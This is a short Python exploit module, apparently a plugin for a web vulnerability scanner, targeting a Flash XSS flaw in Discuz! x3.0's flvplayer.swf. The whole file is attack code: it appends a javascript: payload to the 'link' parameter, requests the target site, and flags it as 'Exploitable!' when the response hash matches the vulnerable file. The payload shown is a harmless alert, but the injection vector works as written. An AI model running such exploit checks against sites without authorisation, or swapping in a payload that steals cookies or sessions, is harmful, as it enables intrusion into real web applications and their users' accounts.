#!/usr/bin/env python
#-*-coding:utf-8-*-

from modules.http import http
from modules.plugins import logger
import hashlib

author = "Chu <root@sh3ll.me>"
title = 'Flash Player XSS'
description = "Discuz! x3.0, /static/image/common/flvplayer.swf Flash XSS"
reference = "http://www.ipuman.com/pm6/138/"
options = {
    'target':'http://www.xxoo.com'
}

def exploit(options):
    url = options['target']['current_value']
    url = url + "/static/image/common/flvplayer.swf?file=1.flv&" \
                "linkfromdisplay=true&link=javascript:alert(1);"
    logger.process("Requesting target site")
    response = http.get(url, 5)
    if hashlib.md5(response.content).hexdigest() == "7d675405ff7c94fa899784b7ccae68d3":
        logger.success("Exploitable!")
        logger.success(url)
        return url
